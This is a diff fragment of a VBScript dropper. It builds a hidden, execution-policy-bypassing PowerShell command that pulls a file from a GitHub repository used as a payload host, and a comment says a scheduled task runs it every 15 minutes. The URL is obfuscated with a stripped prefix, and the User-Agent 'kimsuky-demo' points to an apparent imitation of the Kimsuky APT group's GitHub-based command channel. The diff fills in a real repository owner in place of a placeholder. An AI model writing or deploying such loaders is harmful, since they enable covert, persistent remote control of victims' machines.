@@ -5,7 +5,7 @@ Set sh = CreateObject("WScript.Shell")
 
 ' Same as first.ini but note: this is fetched every 15min by the task
 psCmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
-        """$x='apple_wolf_https://api.github.com/repos/你的GitHub用户名/bahubali/contents/help.ini';" & _
+        """$x='apple_wolf_https://api.github.com/repos/ccxxrr12/bahubali/contents/help.ini';" & _
         "$x=$x.Replace('apple_wolf_','');" & _
         "$h=@{'User-Agent'='kimsuky-demo';'Accept'='application/vnd.github.v3.raw'};" & _
         "$c=(Invoke-WebRequest -Uri $x -Headers $h -UseBasicParsing).Content;" & _
